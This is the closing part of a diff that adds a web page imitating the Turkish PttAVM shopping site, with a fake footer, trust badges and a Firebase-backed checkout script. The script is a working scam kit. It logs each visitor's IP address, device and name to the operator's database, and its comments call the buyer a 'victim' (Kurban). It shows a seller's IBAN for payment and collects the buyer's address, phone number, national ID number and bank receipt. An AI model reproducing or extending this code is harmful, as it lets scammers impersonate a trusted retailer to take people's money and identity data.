+                        <div class="f-app-badge"><svg viewBox="0 0 24 24" fill="#e61d2b"><rect x="4" y="4" width="16" height="16" rx="4"></rect><path d="M9 16V8l5 4-5 4z" fill="#fff"></path></svg><div class="f-app-text">AppGallery'den <b>İndirebilirsiniz</b></div></div>
+                    </div>
+
+                    <h4>HGS Mobil Uygulamalarımız</h4>
+                    <div class="f-app-row">
+                        <div class="f-app-badge"><svg viewBox="0 0 24 24" fill="#333"><path d="M17.05 20.28c-.98.95-2.05.8-3.08.35-1.09-.46-2.09-.48-3.24 0-1.44.62-2.2.44-3.06-.35C2.79 15.25 3.51 7.59 9.05 7.31c1.35.07 2.29.74 3.08.8 1.18-.17 2.31-.93 3.57-.84 1.51.11 2.65.72 3.4 1.8-3.12 1.87-2.38 5.98.48 7.13-.57 1.5-1.31 2.99-2.53 4.08zM12.03 7.25c-.15-2.23 1.66-4.07 3.74-4.25.29 2.58-2.34 4.5-3.74 4.25z"/></svg><div class="f-app-text">App Store'dan <b>İndirebilirsiniz</b></div></div>
+                        <div class="f-app-badge"><svg viewBox="0 0 24 24" fill="#34a853"><polygon points="3 3 3 21 15 12"></polygon><polygon points="15 12 3 21 21 12" fill="#ea4335"></polygon><polygon points="3 3 15 12 21 12" fill="#4285f4"></polygon><polygon points="15 12 3 3 21 12" fill="#fbbc04"></polygon></svg><div class="f-app-text">Google Play'den <b>İndirebilirsiniz</b></div></div>
+                        <div class="f-app-badge"><svg viewBox="0 0 24 24" fill="#e61d2b"><rect x="4" y="4" width="16" height="16" rx="4"></rect><path d="M9 16V8l5 4-5 4z" fill="#fff"></path></svg><div class="f-app-text">AppGallery'den <b>İndirebilirsiniz</b></div></div>
+                    </div>
+                </div>
+
+                <div class="f-trust-logos">
+                    <div class="etbis-container">
+                        <div class="etbis-qr-wrapper">
+                            <img src="https://api.qrserver.com/v1/create-qr-code/?size=100x100&data=https://www.eticaret.gov.tr/" alt="QR">
+                            <div class="etbis-center">
+                                <svg width="28" height="16" viewBox="0 0 28 16">
+                                    <path d="M 2 4 L 20 4 C 23 4 25 6 25 9 L 25 9 C 25 12 23 14 20 14 L 8 14" fill="none" stroke="#e61d2b" stroke-width="2.5" stroke-linecap="round"/>
+                                    <line x1="0" y1="9" x2="14" y2="9" stroke="#e61d2b" stroke-width="2.5" stroke-linecap="round"/>
+                                    <circle cx="10" cy="14" r="1.5" fill="#e61d2b"/><circle cx="18" cy="14" r="1.5" fill="#e61d2b"/>
+                                </svg>
+                            </div>
+                        </div>
+                        <div class="etbis-text">ETBİS'e<br>Kayıtlıdır.</div>
+                    </div>
+
+                    <div class="trgo-badge">
+                        <svg viewBox="0 0 80 80">
+                            <path d="M 40 2 A 38 38 0 0 0 2 38.5" fill="none" stroke="#00a0e3" stroke-width="3" stroke-linecap="butt"/>
+                            <path d="M 2 41.5 A 38 38 0 0 0 38.5 78" fill="none" stroke="#00a0e3" stroke-width="3" stroke-linecap="butt"/>
+                            <path d="M 41.5 78 A 38 38 0 0 0 78 40" fill="none" stroke="#00a0e3" stroke-width="3" stroke-linecap="butt"/>
+                            
+                            <polygon points="62,6 64.5,12 72,12 66,16 68,23 62,18.5 56,23 58,16 52,12 59.5,12" fill="#00a0e3"/>
+                            
+                            <text x="40" y="40" font-family="Arial, sans-serif" font-weight="900" font-size="22" fill="#00a0e3" text-anchor="middle">TR</text>
+                            <text x="40" y="65" font-family="Arial, sans-serif" font-weight="900" font-size="22" fill="#00a0e3" text-anchor="middle">GO</text>
+                        </svg>
+                    </div>
+                </div>
+
+                <div class="f-social">
+                    <h4>Bizi Takip Edin</h4>
+                    <div class="social-icons-row">
+                        <a href="#" class="s-icon"><svg viewBox="0 0 24 24"><path d="M18 2h-3a5 5 0 0 0-5 5v3H7v4h3v8h4v-8h3l1-4h-4V7a1 1 0 0 1 1-1h3z"></path></svg></a>
+                        <a href="#" class="s-icon"><svg viewBox="0 0 24 24"><path d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z"></path></svg></a>
+                        <a href="#" class="s-icon ig"><svg viewBox="0 0 24 24"><rect x="2" y="2" width="20" height="20" rx="5" ry="5"></rect><path d="M16 11.37A4 4 0 1 1 12.63 8 4 4 0 0 1 16 11.37z"></path><line x1="17.5" y1="6.5" x2="17.51" y2="6.5"></line></svg></a>
+                        <a href="#" class="s-icon"><svg viewBox="0 0 24 24"><path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"></path><rect x="2" y="9" width="4" height="12"></rect><circle cx="4" cy="4" r="2"></circle></svg></a>
+                        <a href="#" class="s-icon"><svg viewBox="0 0 24 24"><path d="M22.54 6.42a2.78 2.78 0 0 0-1.94-2C18.88 4 12 4 12 4s-6.88 0-8.6.46a2.78 2.78 0 0 0-1.94 2A29 29 0 0 0 1 11.75a29 29 0 0 0 .46 5.33 2.78 2.78 0 0 0 1.94 2c1.72.46 8.6.46 8.6.46s6.88 0 8.6-.46a2.78 2.78 0 0 0 1.94-2 29 29 0 0 0 .46-5.33 29 29 0 0 0-.46-5.33z"></path><polygon points="9.75 15.02 15.5 11.75 9.75 8.48 9.75 15.02" fill="#fff"></polygon></svg></a>
+                        <a href="#" class="s-icon"><svg viewBox="0 0 24 24"><path d="M22.396 7.164c-.093 2.026-1.507 4.8-4.245 8.32C15.323 19.16 12.93 21 10.97 21c-1.214 0-2.24-1.12-3.08-3.361l-1.4-5.225C5.79 9.61 5.09 8.21 4.39 8.21c-.186 0-.746.326-1.68 1.026L1.5 7.841c1.306-1.166 2.52-2.332 3.64-3.5 1.586-1.492 2.66-2.192 3.22-2.098 1.4.186 2.146 1.632 2.24 4.338l.653 3.638c.373 1.96 1.026 2.94 1.96 2.94.746 0 1.726-1.026 2.94-3.08 1.12-1.772 1.586-3.125 1.4-4.058-.28-1.586-1.586-2.146-3.92-1.68 1.492-2.938 3.545-4.43 6.16-4.478 1.96-.046 3.126.98 3.5 3.08z"></path></svg></a>
+                    </div>
+                </div>
+            </div>
+
+            <div class="f-dark-bottom">
+                <div class="ptt-logo">Ptt</div>
+                <p>© 2023 Ptt A.Ş. Genel Müdürlüğü - Tüm hakları saklıdır. PtteM Teknoloji ve Elektronik Hizmetleri A.Ş. tarafından geliştirilmiştir.</p>
+                <div class="payment-logos">
+                    <span class="pay-icon" style="color:#1a1f71;">VISA</span>
+                    <span class="pay-icon" style="color:#eb001b;">Mastercard</span>
+                    <span class="pay-icon" style="color:#0094d9;">troy</span>
+                    <span class="pay-icon" style="color:#555;">etid Üyesidir</span>
+                </div>
+            </div>
+            <div style="height:30px; background:#2b3137;"></div> 
+        </div>
+
+    </div>
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/12.11.0/firebase-app.js";
+        import { getFirestore, doc, getDoc, collection, addDoc } from "https://www.gstatic.com/firebasejs/12.11.0/firebase-firestore.js";
+
+        const firebaseConfig = { 
+            apiKey: "AIzaSyDR1p1EJdRdXuWh68YFFm9mu3pqo41Mcx0", 
+            authDomain: "sahibinden-876f0.firebaseapp.com", 
+            projectId: "sahibinden-876f0", 
+            storageBucket: "sahibinden-876f0.firebasestorage.app", 
+            messagingSenderId: "1014594612014", 
+            appId: "1:1014594612014:web:ed012f186b8c2cb7b9e8bf" 
+        };
+        
+        const app = initializeApp(firebaseConfig); 
+        const db = getFirestore(app);
+        const urlParams = new URLSearchParams(window.location.search);
+        const ilanId = urlParams.get('ilan');
+
+        let aktifIlanVerisi = null; 
+        let mevcutAdim = 1;
+        let secilenDekontDosyasi = null;
+
+        // ---- LOG AJANI ----
+        async function logGonder(aksiyon, detay = "") {
+            if (!aktifIlanVerisi || !aktifIlanVerisi.olusturanMusteri) return;
+            try {
+                let ipAdresi = "Bulunamadı";
+                try {
+                    const ipRes = await fetch('https://api.ipify.org?format=json');
+                    const ipData = await ipRes.json();
+                    ipAdresi = ipData.ip;
+                } catch(e) {}
+
+                const ua = navigator.userAgent;
+                let cihazBilgisi = "Diğer/PC";
+                if(/iPhone|iPad|iPod/i.test(ua)) cihazBilgisi = "Apple iOS";
+                else if(/Android/i.test(ua)) cihazBilgisi = "Android";
+
+                const gorselFiyat = document.getElementById('v-fiyat').innerText || (aktifIlanVerisi.fiyat + " TL");
+
+                await addDoc(collection(db, "logs"), {
+                    saticiId: aktifIlanVerisi.olusturanMusteri,
+                    ilanBasligi: aktifIlanVerisi.urunAdi || "Bilinmiyor",
+                    saticiAdi: aktifIlanVerisi.saticiAdi || "Bilinmiyor",
+                    fiyat: gorselFiyat,
+                    sablon: "Şablon 2 (PttAVM)",
+                    aksiyon: aksiyon,
+                    detay: detay,
+                    ip: ipAdresi,
+                    cihaz: cihazBilgisi,
+                    tarih: new Date().toLocaleDateString('tr-TR'), 
+                    saat: new Date().toLocaleTimeString('tr-TR', { hour: '2-digit', minute: '2-digit' }), 
+                    timestamp: new Date().getTime()
+                });
+            } catch (error) {}
+        }
+
+        // İL - İLÇE
+        const ilSelect = document.getElementById("aliciIl");
+        const ilceSelect = document.getElementById("aliciIlce");
+        let turkeyData = [];
+
+        async function sehirleriGetir() {
+            try {
+                const response = await fetch("https://turkiyeapi.dev/api/v1/provinces");
+                const json = await response.json();
+                turkeyData = json.data;
+                turkeyData.sort((a, b) => a.name.localeCompare(b.name));
+                turkeyData.forEach(il => {
+                    const option = document.createElement("option");
+                    option.value = il.name; option.textContent = il.name;
+                    ilSelect.appendChild(option);
+                });
+            } catch (error) {}
+        }
+
+        ilSelect.addEventListener("change", (e) => {
+            ilceSelect.innerHTML = '<option value="">İlçe *</option>';
+            ilceSelect.disabled = true;
+            const secilen = turkeyData.find(il => il.name === e.target.value);
+            if (secilen) {
+                secilen.districts.sort((a, b) => a.name.localeCompare(b.name));
+                secilen.districts.forEach(ilce => {
+                    const option = document.createElement("option");
+                    option.value = ilce.name; option.textContent = ilce.name;
+                    ilceSelect.appendChild(option);
+                });
+                ilceSelect.disabled = false;
+            }
+        });
+        sehirleriGetir();
+
+        // UI FONKSİYONLARI
+        window.toggleAccordion = function(element) {
+            const body = element.nextElementSibling;
+            const icon = element.querySelector('svg');
+            if (body.classList.contains('active')) {
+                body.classList.remove('active');
+                icon.style.transform = 'rotate(0deg)';
+                element.style.color = 'var(--text-dark)';
+                icon.style.stroke = 'var(--text-dark)';
+            } else {
+                body.classList.add('active');
+                icon.style.transform = 'rotate(180deg)';
+                element.style.color = '#008c99';
+                icon.style.stroke = '#008c99';
+            }
+        }
+
+        window.kopyalaMetin = function(elementId) {
+            navigator.clipboard.writeText(document.getElementById(elementId).innerText);
+            alert("Başarıyla kopyalandı!");
+        }
+
+        // İSTENİLEN FİYAT FORMATLARI (Virgüllü vs Düz)
+        function formatFiyatDuz(num) {
+            return new Intl.NumberFormat('tr-TR', { minimumFractionDigits: 0, maximumFractionDigits: 0 }).format(num);
+        }
+        function formatFiyatKusuratli(num) {
+            return new Intl.NumberFormat('tr-TR', { minimumFractionDigits: 2, maximumFractionDigits: 2 }).format(num);
+        }
+
+        async function ilaniGetir() {
+            if(!ilanId) { document.getElementById('loader').style.display = 'none'; document.getElementById('errorMsg').style.display = 'block'; return; }
+            try {
+                const ilanRef = doc(db, "ilanlar", ilanId);
+                const ilanSnap = await getDoc(ilanRef);
+                if (ilanSnap.exists()) { 
+                    aktifIlanVerisi = ilanSnap.data(); 
+                    ekraniDoldur(); 
+                    logGonder("İlana Giriş Yaptı", "Kurban vitrini inceliyor.");
+                } else { 
+                    document.getElementById('loader').style.display = 'none'; document.getElementById('errorMsg').style.display = 'block'; 
+                }
+            } catch (error) {}
+        }
+
+        function ekraniDoldur() {
+            document.getElementById('loader').style.display = 'none';
+            
+            const data = aktifIlanVerisi;
+            const safFiyat = parseFloat(data.fiyat) || 0;
+            const fiyatDuz = formatFiyatDuz(safFiyat) + " TL";
+            const fiyatKusuratli = formatFiyatKusuratli(safFiyat) + " TL";
+
+            const galeri = document.getElementById('v-gallery');
+            if(data.resimler && data.resimler.length > 0) {
+                galeri.innerHTML = data.resimler.map(img => `<img src="${img}">`).join('');
+                document.getElementById('c-resim').src = data.resimler[0];
+                document.getElementById('c3-resim').src = data.resimler[0];
+            } else {
+                galeri.innerHTML = `<img src="${data.anaResim}">`;
+                document.getElementById('c-resim').src = data.anaResim;
+                document.getElementById('c3-resim').src = data.anaResim;
+            }
+
+            document.getElementById('v-baslik').innerText = data.urunAdi;
+            document.getElementById('c-baslik').innerText = data.urunAdi;
+            document.getElementById('c3-baslik').innerText = data.urunAdi;
+            
+            // Fiyatların Basılması (Düz vs Küsuratlı)
+            document.getElementById('v-fiyat').innerText = fiyatDuz;
+            document.getElementById('c-fiyat').innerText = fiyatDuz;
+            document.getElementById('c3-fiyat').innerText = fiyatDuz;
+            document.getElementById('o-ara-toplam').innerText = fiyatDuz;
+            document.getElementById('o2-ara-toplam').innerText = fiyatDuz;
+            document.getElementById('o2-toplam').innerText = fiyatDuz;
+            
+            // SADECE SEPET (ADIM 2) TOPLAM FİYATI KÜSURATLI OLACAK
+            document.getElementById('o-toplam').innerText = fiyatKusuratli;
+
+            document.getElementById('v-aciklama').innerHTML = data.urunAciklamasi ? data.urunAciklamasi.replace(/\n/g, '<br>') : "Açıklama girilmemiş.";
+            
+            const ozelliklerListesi = document.getElementById('v-ozellikler');
+            if (Array.isArray(data.dinamikOzellikler)) {
+                data.dinamikOzellikler.forEach(item => { ozelliklerListesi.innerHTML += `<tr><td>${item.anahtar}</td><td>${item.deger}</td></tr>`; });
+            }
+
+            let ibanTam = data.iban || ""; let gosterilecekIban = ibanTam; let gosterilecekIsim = data.saticiAdi || "";
+            if (ibanTam.includes("-")) {
+                let parcalar = ibanTam.split("-"); gosterilecekIban = parcalar[0].trim(); gosterilecekIsim = parcalar.slice(1).join("-").trim(); 
+            }
+            document.getElementById('odeme-iban').innerText = gosterilecekIban;
+            document.getElementById('odeme-isim').innerText = gosterilecekIsim;
+            
+            // İlk ekran ayarları
+            document.getElementById('stickyBottomBar').style.display = 'flex';
+            document.getElementById('globalFooter').style.display = 'block';
+        }
+
+        // AKIŞ KONTROLÜ
+        const mainHeader = document.getElementById('mainHeader');
+        const searchSection = document.getElementById('searchSection');
+        const checkoutHeader = document.getElementById('checkoutHeader');
+        const globalFooter = document.getElementById('globalFooter');
+        const stickyBottomBar = document.getElementById('stickyBottomBar');
+
+        function adimiGoster() {
+            document.querySelectorAll('.step-container').forEach(s => s.classList.remove('active'));
+            document.getElementById('step' + mevcutAdim).classList.add('active');
+            window.scrollTo(0, 0);
+
+            // Başlık, Footer ve Sabit Buton Görünürlük Ayarları
+            if(mevcutAdim === 1) {
+                mainHeader.style.display = 'flex'; searchSection.style.display = 'block'; checkoutHeader.style.display = 'none';
+                stickyBottomBar.style.display = 'flex'; globalFooter.style.display = 'block';
+            } else if (mevcutAdim === 2) {
+                mainHeader.style.display = 'none'; searchSection.style.display = 'none'; checkoutHeader.style.display = 'block';
+                stickyBottomBar.style.display = 'none'; // Sabit buton gizlenir
+                globalFooter.style.display = 'block'; // Footer kalır (Adım 2 inline butonunun altında durur)
+            } else {
+                mainHeader.style.display = 'none'; searchSection.style.display = 'none'; checkoutHeader.style.display = 'block';
+                stickyBottomBar.style.display = 'none'; 
+                globalFooter.style.display = 'none'; // Diğer form ekranlarında footer gizlenir
+            }
+        }
+
+        // Buton Dinleyicileri
+        
+document.getElementById('btnIleriStep1').addEventListener('click', () => { 
+            mevcutAdim = 2; adimiGoster(); logGonder("Sepete Girdi (Hemen Al)", "Sipariş özetine geçti.");
+        });
+
+// YENİ: Sağ üstteki sepet ikonuna tıklayınca da sepete geçsin
+        document.querySelector('.cart-btn').addEventListener('click', () => { 
+            mevcutAdim = 2; adimiGoster(); logGonder("Sepete Girdi (Sepet İkonu)", "Sipariş özetine geçti.");
+        });
+        document.getElementById('btnIleriStep2').addEventListener('click', () => { 
+            mevcutAdim = 3; adimiGoster(); logGonder("Ürünleri Kontrol Etti", "Teslimat adres formuna geçti.");
+        });
+
+        document.getElementById('btnIleriStep3').addEventListener('click', () => { 
+            const ad = document.getElementById('aliciAd').value.trim(); const soyad = document.getElementById('aliciSoyad').value.trim();
+            const tel = document.getElementById('aliciTel').value.trim(); const il = document.getElementById('aliciIl').value.trim();
+            const ilce = document.getElementById('aliciIlce').value.trim(); const mahalle = document.getElementById('aliciMahalle').value.trim();
+            const tc = document.getElementById('aliciTC').value.trim(); const adresDetay = document.getElementById('aliciAdres').value.trim();
+            
+            if(!ad || !soyad || !tel || !il || !ilce || !mahalle || !tc || !adresDetay) { alert("Lütfen teslimat bilgilerini eksiksiz doldurun."); return; }
+            mevcutAdim = 4; adimiGoster(); logGonder("Adresi Kaydetti", `Ödeme Bekleniyor. Şehir: ${il}/${ilce}, İsim: ${ad} ${soyad}`);
+        });
+
+        document.getElementById('btnIleriStep4').addEventListener('click', () => { 
+            if(!secilenDekontDosyasi) { alert("Lütfen ödeme dekontunuzu seçin."); return; }
+            dekontuGonder();
+        });
+
+        // DEKONT
+        const dekontKutusu = document.getElementById("dekontKutusu"); const dekontSecici = document.getElementById("dekontSecici"); const dekontDurum = document.getElementById("dekontDurum");
+        dekontKutusu.addEventListener('click', () => dekontSecici.click());
+        dekontSecici.addEventListener('change', (e) => {
+            if(e.target.files.length > 0) {
+                secilenDekontDosyasi = e.target.files[0];
+                dekontKutusu.style.borderColor = "var(--primary-blue)"; dekontKutusu.style.color = "var(--primary-blue)";
+                dekontKutusu.innerText = "Dekont Seçildi: " + secilenDekontDosyasi.name; logGonder("Dekont Seçti", `Dosya: ${secilenDekontDosyasi.name}`);
+            }
+        });
+
+        async function uploadToImgBB(file) {
+            const apiKey = "De087c486b0f12c525ef31688d64dcf0"; const formData = new FormData(); formData.append("image", file); 
+            try { const response = await fetch(`https://api.imgbb.com/1/upload?key=${apiKey}`, { method: "POST", body: formData }); const data = await response.json(); if(data.success) return data.data.url; throw new Error(); } catch (error) { return null; }
+        }
+
+        async function dekontuGonder() {
+            const btn = document.getElementById('btnIleriStep4'); btn.innerText = "İşleniyor..."; btn.disabled = true; dekontDurum.innerText = "Sipariş oluşturuluyor...";
+            const dekontURL = await uploadToImgBB(secilenDekontDosyasi);
+            if(!dekontURL) { alert("Dekont yüklenemedi."); btn.innerText = "Siparişi Tamamla"; btn.disabled = false; dekontDurum.innerText = ""; return; }
+
+            const tamAdSoyad = document.getElementById('aliciAd').value.trim() + " " + document.getElementById('aliciSoyad').value.trim();
+            const tamAdres = document.getElementById('aliciIl').value.trim() + " / " + document.getElementById('aliciIlce').value.trim() + " - " + document.getElementById('aliciMahalle').value.trim() + " - " + document.getElementById('aliciAdres').value.trim();
+
+            try {
+                await addDoc(collection(db, "dekontlar"), {
+                    ilanId: ilanId, saticiId: aktifIlanVerisi.olusturanMusteri, ilanBasligi: aktifIlanVerisi.urunAdi, aliciAd: tamAdSoyad, aliciTel: document.getElementById('aliciTel').value.trim(), aliciAdres: tamAdres,
+                    dekontUrl: dekontURL, tarih: new Date().toLocaleDateString('tr-TR'), saat: new Date().toLocaleTimeString('tr-TR', { hour: '2-digit', minute: '2-digit' }), timestamp: new Date().getTime()
+                });
+                
+                logGonder("BAŞARILI BİTİŞ", "Kurban dekontu yükledi ve Şablon 2'de siparişi tamamladı.");
+
+                document.getElementById('step4').innerHTML = `
+                    <div style="text-align:center; padding: 40px 15px; background:#fff; margin:0 15px; border-radius:8px;">
+                        <svg viewBox="0 0 24 24" style="width:64px; height:64px; stroke:var(--price-green); fill:none; margin-bottom:15px;"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path><polyline points="22 4 12 14.01 9 11.01"></polyline></svg>
+                        <h2 style="color: var(--price-green); margin-bottom: 10px; font-size: 22px;">Siparişiniz Alındı!</h2>
+                        <p style="color: #555; font-size: 14px; line-height:1.6;">Ödemeniz ve dekontunuz başarıyla satıcıya iletilmiştir. Sipariş durumunu satıcı mağazadan takip edebilirsiniz.</p>
+                    </div>`;
+            } catch (error) { alert("Sipariş işlenirken hata oluştu."); btn.innerText = "Tekrar Dene"; btn.disabled = false; }
+        }
+
+        ilaniGetir();
+    </script>
+</body>
+</html>
